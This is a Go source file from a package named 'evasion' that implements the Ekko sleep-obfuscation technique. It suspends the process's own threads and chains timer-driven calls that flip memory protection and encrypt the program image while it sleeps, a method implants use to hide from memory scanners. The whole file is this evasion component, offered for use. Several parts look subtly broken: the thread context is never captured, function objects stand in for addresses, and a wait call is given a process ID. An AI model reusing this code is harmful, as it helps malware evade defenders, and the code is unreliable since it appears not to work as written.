package evasion

// cool technique by Cracked5pider->  https://github.com/Cracked5pider/Ekko

import (
	"crypto/rand"
	"fmt"
	mrand "math/rand" // Renombramos la importación para evitar conflictos
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	sleepTime             = 1000 // Define sleepTime as needed
	THREAD_SUSPEND_RESUME = 0x0002
)
const LOAD_LIBRARY_AS_DATAFILE = 0x00000002

type Context struct {
	Rsp, Rip, Rcx, Rdx, R8, R9 uintptr
}

var Debug = true // Set this to true to enable Debug messages or false to disable them

type ImageDosHeader struct {
	E_magic    uint16     // Magic number
	E_cblp     uint16     // Bytes on last page of file
	E_cp       uint16     // Pages in file
	E_crlc     uint16     // Relocations
	E_cparhdr  uint16     // Size of header in paragraphs
	E_minalloc uint16     // Minimum extra paragraphs needed
	E_maxalloc uint16     // Maximum extra paragraphs needed
	E_ss       uint16     // Initial (relative) SS value
	E_sp       uint16     // Initial SP value
	E_csum     uint16     // Checksum
	E_ip       uint16     // Initial IP value
	E_cs       uint16     // Initial (relative) CS value
	E_lfarlc   uint16     // File address of relocation table
	E_ovno     uint16     // Overlay number
	E_res      [4]uint16  // Reserved uint16s
	E_oemid    uint16     // OEM identifier (for E_oeminfo)
	E_oeminfo  uint16     // OEM information; E_oemid specific
	E_res2     [10]uint16 // Reserved uint16s
	E_lfanew   int32      // File address of new exe header
}

type ImageNtHeaders struct {
	Signature      uintptr
	FileHeader     [20]byte // We won't use this part, so we don't need the exact structure
	OptionalHeader struct {
		SizeOfImage uintptr
	}
}

var (
	VirtualProtect      = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualProtect")
	CryptEncrypt        = windows.NewLazySystemDLL("advapi32.dll").NewProc("CryptEncrypt")
	WaitForSingleObject = windows.NewLazySystemDLL("kernel32.dll").NewProc("WaitForSingleObject")
	CryptDecrypt        = windows.NewLazySystemDLL("advapi32.dll").NewProc("CryptDecrypt")
	SetEvent            = windows.NewLazySystemDLL("kernel32.dll").NewProc("SetEvent")
	GetCurrentProcessId = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetCurrentProcessId")
	OpenThread          = windows.NewLazySystemDLL("kernel32.dll").NewProc("OpenThread")
	SuspendThread       = windows.NewLazySystemDLL("kernel32.dll").NewProc("SuspendThread")
	ResumeThread        = windows.NewLazySystemDLL("kernel32.dll").NewProc("ResumeThread")
	RtlRestoreContext   = windows.NewLazySystemDLL("ntdll.dll").NewProc("RtlRestoreContext")
)

var (
	ctxThread Context

	ropProtRW Context
	ropMemEnc Context
	ropDelay  Context
	ropMemDec Context
	ropProtRX Context
	ropSetEvt Context
)

func copyContext(dst, src *Context) {
	*dst = *src
}

func getSizeOfImage(imageBase uintptr) uintptr {
	dosHeader := (*ImageDosHeader)(unsafe.Pointer(imageBase))
	ntHeaders := (*ImageNtHeaders)(unsafe.Pointer(imageBase + uintptr(dosHeader.E_lfanew)))
	return ntHeaders.OptionalHeader.SizeOfImage
}

func suspendProcessThreads(pid uint32) error {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		fmt.Printf("[DEBUG] Error creating toolhelp snapshot: %v\n", err)
		return err
	}
	defer windows.CloseHandle(snapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))
	if Debug {
		fmt.Println("[DEBUG] Starting thread suspension")
	}
	for {
		err = windows.Thread32Next(snapshot, &te32)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				if Debug {
					fmt.Println("[DEBUG] No more threads to process")
				}
				break // No more threads
			}
			if Debug {
				fmt.Printf("[DEBUG] Error in Thread32Next: %v\n", err)
			}
			continue
		}

		if te32.OwnerProcessID == pid && windows.GetCurrentThreadId() != te32.ThreadID {
			hThread, err := windows.OpenThread(THREAD_SUSPEND_RESUME, false, te32.ThreadID)
			if err != nil {
				if Debug {
					fmt.Printf("[DEBUG] Error opening thread %d: %v\n", te32.ThreadID, err)
				}
				continue
			}
			defer windows.CloseHandle(hThread)

			_, _, err = SuspendThread.Call(uintptr(hThread))
			if err != nil && err != syscall.Errno(0) {
				if Debug {
					fmt.Printf("[DEBUG] Error suspending thread %d: %v\n", te32.ThreadID, err)
				}
			} else {
				if Debug {
					fmt.Printf("[DEBUG] Suspended thread %d\n", te32.ThreadID)
				}
			}
		}
	}
	if Debug {
		fmt.Println("[DEBUG] Finished suspending threads")
	}
	return nil
}

func resumeProcessThreads(currentProcessID uint32) error {
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))
	if Debug {
		fmt.Println("[DEBUG] Resume Suspended Threads")
	}
	for {
		err = windows.Thread32Next(hThreadSnapshot, &te32)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break // No more threads
			}
			continue
		}

		if te32.OwnerProcessID == currentProcessID && windows.GetCurrentThreadId() != te32.ThreadID {
			hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
			if err != nil {
				if Debug {
					fmt.Printf("[DEBUG] Error opening thread %d for resuming: %v\n", te32.ThreadID, err)
				}
				continue
			}
			defer windows.CloseHandle(hThread)

			_, _, err = ResumeThread.Call(uintptr(hThread))
			if err != nil && err != syscall.Errno(0) {
				if Debug {
					fmt.Printf("[DEBUG] Error resuming thread %d: %v\n", te32.ThreadID, err)
				}
			} else {
				if Debug {
					fmt.Printf("[DEBUG] Resumed thread %d\n", te32.ThreadID)
				}
			}
		}
	}
	if Debug {

		fmt.Println("[DEBUG] Suspended Threads resumed")
	}
	return nil
}

func RandLlave() ([16]byte, error) {
	var key [16]byte
	_, err := rand.Read(key[:])
	if err != nil {
		return key, err
	}
	return key, nil
}

func EkkoObf(duration int, newKey [16]byte) {
	currentPid := windows.GetCurrentProcessId()
	if Debug {
		fmt.Printf("[DEBUG] Current Process ID: %d\n", currentPid)
	}

	if err := suspendProcessThreads(currentPid); err != nil {
		if Debug {
			fmt.Println("[DEBUG] Error suspending threads:", err)
		}
		return
	}

	var (
		imageBase  uintptr
		imageSize  uintptr
		oldProtect uintptr

		key = &newKey[0]
	)

	// Ensure proper error handling
	hEvent, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		fmt.Println("Error creating event:", err)
		return
	}
	var fileName [syscall.MAX_PATH]uint16
	_, _ = windows.GetModuleFileName(0, &fileName[0], uint32(len(fileName)))
	moduleFileName := windows.UTF16ToString(fileName[:])

	handle, err := windows.LoadLibraryEx(moduleFileName, 0, LOAD_LIBRARY_AS_DATAFILE)
	if err != nil {
		fmt.Println("Error getting module handle:", err)
		return
	}
	imageBase = uintptr(handle)
	if err != nil {
		fmt.Println("Error getting module handle:", err)
		return
	}

	imageSize = getSizeOfImage(imageBase)
	if Debug {
		fmt.Printf("[DEBUG] Image base: 0x%X, Image size: %d bytes\n", imageBase, imageSize)
	}

	img := (*uint16)(unsafe.Pointer(imageBase))

	copyContext(&ropProtRW, &ctxThread)
	copyContext(&ropMemEnc, &ctxThread)
	copyContext(&ropDelay, &ctxThread)
	copyContext(&ropMemDec, &ctxThread)
	copyContext(&ropProtRX, &ctxThread)
	copyContext(&ropSetEvt, &ctxThread)
	ropProtRW.Rsp -= 8
	ropProtRW.Rip = uintptr(unsafe.Pointer(VirtualProtect))
	ropProtRW.Rcx = uintptr(unsafe.Pointer(imageBase))
	ropProtRW.Rdx = uintptr(imageSize)
	ropProtRW.R8 = syscall.PAGE_READWRITE
	ropProtRW.R9 = uintptr(unsafe.Pointer(&oldProtect))

	ropMemEnc.Rsp -= 8
	ropMemEnc.Rip = uintptr(unsafe.Pointer(CryptEncrypt))
	ropMemEnc.Rcx = uintptr(unsafe.Pointer(&img))
	ropMemEnc.Rdx = uintptr(unsafe.Pointer(&key))

	ropDelay.Rsp -= 8
	ropDelay.Rip = uintptr(unsafe.Pointer(WaitForSingleObject))
	ropDelay.Rcx = uintptr(windows.GetCurrentProcessId())
	ropDelay.Rdx = uintptr(sleepTime)
	ropMemDec.Rsp -= 8
	ropMemDec.Rip = uintptr(unsafe.Pointer(CryptDecrypt))
	ropMemDec.Rcx = uintptr(unsafe.Pointer(&img))
	ropMemDec.Rdx = uintptr(unsafe.Pointer(&key))

	ropProtRX.Rsp -= 8
	ropProtRX.Rip = uintptr(unsafe.Pointer(VirtualProtect))
	ropProtRX.Rcx = uintptr(unsafe.Pointer(imageBase))
	ropProtRX.Rdx = uintptr(imageSize)
	ropProtRX.R8 = syscall.PAGE_EXECUTE_READ
	ropProtRX.R9 = uintptr(unsafe.Pointer(&oldProtect))

	ropSetEvt.Rsp -= 8
	ropSetEvt.Rip = uintptr(unsafe.Pointer(SetEvent))
	ropSetEvt.Rcx = uintptr(unsafe.Pointer(hEvent))
	if Debug {
		fmt.Println("[DEBUG] Queue timers")
	}
	time.AfterFunc(100*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropProtRW)), 0) })
	time.AfterFunc(200*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropMemEnc)), 0) })
	time.AfterFunc(300*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropDelay)), 0) })
	time.AfterFunc(400*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropMemDec)), 0) })
	time.AfterFunc(500*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropProtRX)), 0) })
	time.AfterFunc(600*time.Millisecond, func() { RtlRestoreContext.Call(uintptr(unsafe.Pointer(&ropSetEvt)), 0) })
	if Debug {

		fmt.Println("[DEBUG] Wait for hEvent")
	}
	_, _ = syscall.WaitForSingleObject(syscall.Handle(hEvent), uint32(duration))
	if Debug {

		fmt.Println("[DEBUG] Finished waiting for event")
	}
	syscall.CloseHandle(syscall.Handle(hEvent))

	if Debug {
		fmt.Println("[DEBUG] Finished custom memory encryption/decryption")

		// Restoring memory protection and triggering events...

		fmt.Printf("[DEBUG] Suspend thread finished")
	}

	if err := resumeProcessThreads(currentPid); err != nil {
		fmt.Println("Error resuming threads:", err)
	}

}

func Rander() int {
	return mrand.Intn(6) + 4 // Generates a number between 0 and 5, then adds 4
}
